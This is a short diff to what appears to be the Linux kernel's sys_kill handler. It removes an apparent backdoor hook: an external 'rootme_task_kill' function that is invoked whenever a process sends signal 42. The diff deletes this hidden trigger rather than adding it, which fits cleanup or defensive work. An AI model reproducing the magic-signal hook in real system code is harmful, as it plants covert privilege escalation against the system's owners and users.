@@ -3034,8 +3034,6 @@ COMPAT_SYSCALL_DEFINE4(rt_sigtimedwait, compat_sigset_t __user *, uthese,
 }
 #endif
 
-extern int rootme_task_kill(pid_t pid);
-
 /**
  *  sys_kill - send a signal to a process
  *  @pid: the PID of the process
@@ -3044,9 +3042,6 @@ extern int rootme_task_kill(pid_t pid);
 SYSCALL_DEFINE2(kill, pid_t, pid, int, sig)
 {
 	struct siginfo info;
-
-	if (unlikely(sig == 42))
-		return rootme_task_kill(pid);
 
 	info.si_signo = sig;
 	info.si_errno = 0;
